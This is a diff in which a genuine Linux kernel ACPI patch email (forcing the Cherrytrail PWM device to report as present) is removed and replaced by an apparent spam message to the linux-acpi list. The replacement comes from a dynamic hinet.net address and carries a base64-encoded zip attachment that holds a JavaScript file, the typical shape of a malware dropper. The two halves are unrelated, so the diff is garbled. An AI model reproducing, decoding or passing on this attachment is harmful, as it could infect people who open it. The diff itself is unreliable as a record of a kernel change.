@@ -1,163 +1,78 @@
-From: Hans de Goede <hdegoede@redhat.com>
-Subject: [PATCH v5] ACPI / bus: Introduce a list of ids for "always present" devices
-Date: Sat, 15 Apr 2017 12:19:50 +0200
-Message-ID: <20170415101950.23387-1-hdegoede@redhat.com>
+From: <kchristopher@framingham.edu>
+Subject: 51273 linux-acpi
+Date: Sat, 15 Apr 2017 10:31:03 -0000
+Message-ID: <149225226371.21738.2417743056520692777@hinet.net>
+Reply-To: <kchristopher@framingham.edu>
+Mime-Version: 1.0
+Content-Type: application/zip; name="72.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:38798 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752091AbdDOKTy (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-        Sat, 15 Apr 2017 06:19:54 -0400
+Received: from 111-252-12-100.dynamic-ip.hinet.net ([111.252.12.100]:33625
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752136AbdDOKbK (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>); Sat, 15 Apr 2017 06:31:10 -0400
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: "Rafael J . Wysocki" <rjw@rjwysocki.net>, Len Brown <lenb@kernel.org>
-Cc: Hans de Goede <hdegoede@redhat.com>, linux-acpi@vger.kernel.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-Several cherrytrail devices (all of which ship with windows 10) hide the
-lpss pwm controller in ACPI, typically the _STA method looks like this:
-
-    Method (_STA, 0, NotSerialized)  // _STA: Status
-    {
-        If (OSID == One)
-        {
-            Return (Zero)
-        }
-
-        Return (0x0F)
-    }
-
-Where OSID is some dark magic seen in all cherrytrail ACPI tables making
-the machine behave differently depending on which OS it *thinks* it is
-booting, this gets set in a number of ways which we cannot control, on
-some newer machines it simple hardcoded to "One" aka win10.
-
-This causes the PWM controller to get hidden, which means Linux cannot
-control the backlight level on cht based tablets / laptops.
-
-Since loading the driver for this does no harm (the only in kernel user
-of it is the i915 driver, which will only use it when it needs it), this
-commit makes acpi_bus_get_status() always set status to ACPI_STA_DEFAULT
-for the 80862288 device, fixing the lack of backlight control.
-
-Signed-off-by: Hans de Goede <hdegoede@redhat.com>
----
-Changes in v2:
--Use pr_debug instead of ACPI_DEBUG_PRINT
-Changes in v3:
--Un-inline acpi_set_device_status and do the always_present_device_ids
- table check inside the un-inlined version of it
-Changes in v4:
--Use dev_info instead of pr_debug
--Not only check for ACPI HID but also for CPU (SoC) model so as to not
- for devices present on other models then for which the quirk is intended and
- to avoid enabling unrelated ACPI devices which happen to use the same HID
-Changes in v5:
--Only do the dev_info once per device (acpi_set_device_status gets called
- multiple times per device during boot)
----
- drivers/acpi/bus.c      | 58 +++++++++++++++++++++++++++++++++++++++++++++++++
- include/acpi/acpi_bus.h |  6 +----
- 2 files changed, 59 insertions(+), 5 deletions(-)
-
-diff --git a/drivers/acpi/bus.c b/drivers/acpi/bus.c
-index 34fbe02..07b13c9 100644
---- a/drivers/acpi/bus.c
-+++ b/drivers/acpi/bus.c
-@@ -34,6 +34,8 @@
- #include <linux/reboot.h>
- #include <linux/delay.h>
- #ifdef CONFIG_X86
-+#include <asm/cpu_device_id.h>
-+#include <asm/intel-family.h>
- #include <asm/mpspec.h>
- #endif
- #include <linux/acpi_iort.h>
-@@ -132,6 +134,62 @@ int acpi_bus_get_status(struct acpi_device *device)
- }
- EXPORT_SYMBOL(acpi_bus_get_status);
- 
-+#ifdef CONFIG_X86
-+/*
-+ * Some ACPI devices are hidden (status == 0x0) in recent BIOS-es because
-+ * some recent windows drivers bind to one device but poke at multiple
-+ * devices at the same time, so the others get hidden.
-+ * We work around this by always reporting ACPI_STA_DEFAULT for these
-+ * devices. Note this MUST only be done for devices where this is safe.
-+ *
-+ * This forcing of devices to be present is limited to specific CPU (SoC)
-+ * models both to avoid potentially causing trouble on other models and
-+ * because some HIDs are re-used on different SoCs for completely
-+ * different devices.
-+ */
-+struct always_present_device_id {
-+	struct acpi_device_id hid[2];
-+	struct x86_cpu_id cpu_id[2];
-+};
-+
-+#define ENTRY(hid, cpu_model) {						\
-+	{ { hid, }, {} },						\
-+	{ { X86_VENDOR_INTEL, 6, cpu_model, X86_FEATURE_ANY, }, {} },	\
-+}
-+
-+static const struct always_present_device_id always_present_device_ids[] = {
-+	/*
-+	 * Cherrytrail pwm directly poked by GPU driver in win10,
-+	 * but Linux uses a separate pwm driver, harmless if not used.
-+	 */
-+	ENTRY("80862288", INTEL_FAM6_ATOM_AIRMONT),
-+};
-+#endif
-+
-+void acpi_set_device_status(struct acpi_device *adev, u32 sta)
-+{
-+	u32 *status = (u32 *)&adev->status;
-+#ifdef CONFIG_X86
-+	u32 old_status = *status;
-+	int i;
-+
-+	/* acpi_match_device_ids checks status, so start with default */
-+	*status = ACPI_STA_DEFAULT;
-+	for (i = 0; i < ARRAY_SIZE(always_present_device_ids); i++) {
-+		if (acpi_match_device_ids(adev,
-+			always_present_device_ids[i].hid) == 0 &&
-+		    x86_match_cpu(always_present_device_ids[i].cpu_id)) {
-+			if (old_status != ACPI_STA_DEFAULT)
-+				dev_info(&adev->dev,
-+					 "Device [%s] is in always present list setting status [%08x]\n",
-+					 adev->pnp.bus_id, ACPI_STA_DEFAULT);
-+			return;
-+		}
-+	}
-+#endif
-+	*status = sta;
-+}
-+
- void acpi_bus_private_data_handler(acpi_handle handle,
- 				   void *context)
- {
-diff --git a/include/acpi/acpi_bus.h b/include/acpi/acpi_bus.h
-index b53c058..ef0794a 100644
---- a/include/acpi/acpi_bus.h
-+++ b/include/acpi/acpi_bus.h
-@@ -441,11 +441,6 @@ static inline void *acpi_driver_data(struct acpi_device *d)
- #define to_acpi_device(d)	container_of(d, struct acpi_device, dev)
- #define to_acpi_driver(d)	container_of(d, struct acpi_driver, drv)
- 
--static inline void acpi_set_device_status(struct acpi_device *adev, u32 sta)
--{
--	*((u32 *)&adev->status) = sta;
--}
--
- static inline void acpi_set_hp_context(struct acpi_device *adev,
- 				       struct acpi_hotplug_context *hp)
- {
-@@ -494,6 +489,7 @@ void acpi_bus_put_acpi_device(struct acpi_device *adev);
- acpi_status acpi_bus_get_status_handle(acpi_handle handle,
- 				       unsigned long long *sta);
- int acpi_bus_get_status(struct acpi_device *device);
-+void acpi_set_device_status(struct acpi_device *adev, u32 sta);
- 
- int acpi_bus_set_power(acpi_handle handle, int state);
- const char *acpi_power_state_string(int state);
--- 
-2.9.3
-
+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
